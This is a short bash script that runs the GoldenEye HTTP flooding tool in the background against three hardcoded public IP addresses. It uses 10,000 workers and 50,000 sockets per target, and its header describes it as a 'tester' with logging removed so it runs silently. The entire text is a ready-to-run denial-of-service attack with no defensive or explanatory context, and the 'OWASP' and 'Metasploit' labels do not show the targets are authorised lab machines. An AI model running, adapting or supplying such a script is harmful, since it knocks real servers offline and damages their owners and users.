#!/bin/bash
# Multi-target GoldenEye tester (logging removed, silent)

# Target servers
OWASP_SERVER="https://41.204.160.1"
METASPLOIT_SERVER="https://41.89.1.3"
SAMPLE_SERVER="https://41.89.161.2"

# GoldenEye settings
WORKERS=10000
SOCKETS=50000
METHOD="random"
DEBUG="-d"
NOSSL="-n"

# Test OWASP server
python3 goldeneye.py $OWASP_SERVER -w $WORKERS -s $SOCKETS -m $METHOD $DEBUG $NOSSL &
PID1=$!

sleep 5

# Test Metasploit server
python3 goldeneye.py $METASPLOIT_SERVER -w $WORKERS -s $SOCKETS -m $METHOD $DEBUG $NOSSL &
PID2=$!

sleep 5

# Test Sample server
python3 goldeneye.py $SAMPLE_SERVER -w $WORKERS -s $SOCKETS -m $METHOD $DEBUG $NOSSL &
PID3=$!
